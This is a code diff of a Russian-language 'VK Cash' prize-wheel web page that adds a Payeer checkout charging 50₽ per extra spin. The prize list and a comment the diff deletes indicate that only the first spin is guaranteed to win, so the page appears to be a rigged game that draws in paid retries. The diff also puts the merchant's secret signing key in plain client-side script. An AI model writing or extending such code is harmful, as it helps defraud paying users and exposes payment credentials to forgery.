@@ -123,7 +123,7 @@
   </div>
 
   <button id="spinBtn" onclick="spin()">Крутить колесо</button>
-  <button id="payBtn" onclick="pay()" style="display:none;">Попробовать снова за 50₽</button>
+  <button id="payBtn" onclick="payWithPayeer()" style="display:none;">Попробовать снова за 50₽</button>
 
   <div class="result" id="result"></div>
   <div id="code"></div>
@@ -153,10 +153,22 @@
     </div>
   </div>
 
+  <!-- Форма Payeer -->
+  <form id="payeerForm" method="post" action="https://payeer.com/merchant/" target="_blank" style="display:none;">
+    <input type="hidden" name="m_shop" value="2210792738">
+    <input type="hidden" name="m_orderid" id="m_orderid">
+    <input type="hidden" name="m_amount" value="50.00">
+    <input type="hidden" name="m_curr" value="RUB">
+    <input type="hidden" name="m_desc" id="m_desc">
+    <input type="hidden" name="m_sign" id="m_sign">
+    <input type="submit" id="m_submit">
+  </form>
+
   <script>
     let spinning = false;
     let firstSpin = true;
     let currentRotation = 0;
+    const secretKey = "8KfFEx5giAxaIVYB";
 
     const wheel = document.getElementById("wheel");
     const resultEl = document.getElementById("result");
@@ -164,7 +176,7 @@
     const payBtn = document.getElementById("payBtn");
     const codeBlock = document.getElementById("code");
 
-    const prizes = [50, 0, 0, 0, 0]; // Только первая попытка гарантированно 50₽
+    const prizes = [50, 0, 0, 0, 0];
 
     function spin() {
       if (spinning) return;
@@ -202,9 +214,23 @@
       }, 5000);
     }
 
-    function pay() {
-      window.open("https://widget.donatepay.ru/widgets/page/7549bd7deeb167c930b7ab588b1aa54aa82e2910567619e1a834984b89495cf5?widget_id=6642901&sum=50", "_blank");
-      // После оплаты пользователь вручную обновляет страницу или вводит код в бота
+    async function payWithPayeer() {
+      const shopId = "2210792738";
+      const orderId = "VKCASH_" + Date.now();
+      const amount = "50.00";
+      const currency = "RUB";
+      const desc = btoa("VK Cash Повторная попытка");
+
+      const signRaw = `${shopId}:${orderId}:${amount}:${currency}:${desc}:${secretKey}`;
+      const hashBuffer = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(signRaw));
+      const hashArray = Array.from(new Uint8Array(hashBuffer));
+      const sign = hashArray.map(b => b.toString(16).padStart(2, "0")).join("").toUpperCase();
+
+      document.getElementById("m_orderid").value = orderId;
+      document.getElementById("m_desc").value = desc;
+      document.getElementById("m_sign").value = sign;
+
+      document.getElementById("payeerForm").submit();
     }
 
     function generateCode() {
